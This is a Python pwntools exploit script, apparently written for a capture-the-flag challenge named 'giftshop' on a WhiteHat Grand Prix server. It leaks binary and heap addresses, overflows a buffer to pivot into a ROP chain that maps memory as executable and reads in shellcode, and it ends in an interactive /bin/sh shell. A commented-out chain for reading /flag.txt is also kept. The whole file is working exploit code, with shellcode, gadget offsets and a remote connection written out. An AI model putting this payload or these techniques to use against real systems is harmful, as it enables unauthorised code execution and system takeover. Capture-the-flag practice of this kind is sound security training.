#!/usr/bin/python
from pwn import *
import sys
#sys.path.append('/home/lord_idiot/CTF-Tools/python-libs')

HOST = "pwn01.grandprix.whitehatvn.com"
PORT = 26129

#context.log_level = "DEBUG"

def order(l, addr, letter):
	r.sendlineafter("Your choice:\n", "1")
	r.sendlineafter("Would you want to change your name or receiver's name ? y/n\n", "n")
	r.recvuntil("\n")
	for i in l:
		r.sendline(str(i))
	r.sendline("6")
	r.sendlineafter("Do you want to ship it ? y/n\n", "y")
	r.sendlineafter("Enter your address: \n", addr)
	r.sendlineafter("A letter for her/him:\n", letter)
	return

def show(ind):
	r.sendlineafter("Your choice:\n", "2")
	r.recvuntil("index: {} - Name: ".format(ind))
	return r.recvuntil(" - receiver")[:-11]


def exploit(r):

	r.recvuntil("0x")
	base = int(r.recvline().strip("\n"), 16)-0x2030D8
	leaveret = base + 0x1176

	r.sendlineafter("Can you give me your name plzz ??\n", "b"*16)
	r.sendlineafter("Enter the receiver's name plzz: \n", "cccc")

	#leak heap address
	order([2], "boobs", "A"*200+p32(0xffffffff))
	order([2], "address", "letter")
	heapleak = u64(show(1)[16:].ljust(8, "\x00"))
	print hex(heapleak)
	print hex(base)

	#bof to rop
	rdi = base + 0x225f
	rsi = base + 0x2261
	rdx = base + 0x2265
	rax = base + 0x2267
	ret = base + 0xae1
	addraxrdx = base + 0xf3f
	syscall = base + 0x2254
	fread = base + 0xbf0
	puts = base + 0xb40
	setbuf = base + 0xb70

	rop = p64(ret)*21 #some rop nops because my local heap offsets are different from the remote offset (different libc versions)
	# #open
	# rop += p64(rdi) + p64(heapleak)
	# rop += p64(rsi) + p64(0)#p64(heapleak-0x2b0+len("/flag.txt\x00"))
	# rop += p64(rdx) + p64(0)
	# rop += p64(rax) + p64(2)
	# rop += p64(syscall)

	# # rop += p64(rdx) + p64(base + 0xda0 - int(sys.argv[2]))
	# # rop += p64(addraxrdx)

	# #read
	# rop += p64(rdi) + p64(0)
	# rop += p64(rsi) + p64(base+0x203820)
	# rop += p64(rdx) + p64(30)
	# rop += p64(rax) + p64(0)
	# rop += p64(syscall)
	# #write
	# rop += p64(rdi) + p64(base)
	# rop += p64(puts)
	# rop += p64(rdi) + p64(heapleak)
	# rop += p64(puts)
	# rop += p64(rdi) + p64(base+0x203820)
	# rop += p64(puts)

	#mprotect
	rop += p64(rdi) + p64(base + 0x203000)
	rop += p64(rsi) + p64(4096)
	rop += p64(rdx) + p64(7)
	rop += p64(rax) + p64(9)
	rop += p64(base + 0x2250)#p64(syscall)

	#read
	rop += p64(rdi) + p64(0)
	rop += p64(rsi) + p64(base + 0x203000)
	rop += p64(rdx) + p64(40)
	rop += p64(rax) + p64(0)
	rop += p64(syscall)

	rop += p64(base + 0x203000)


	
	rop_addr = heapleak+0x370 #-0x2b0
	order([2], rop, "B"*200+p64(2)+p64(rop_addr)+p64(leaveret))

	shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
	r.sendline(shellcode)


	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./giftshop"
	e = ELF(elf_name)
	
	libc_name = ""
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name})
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
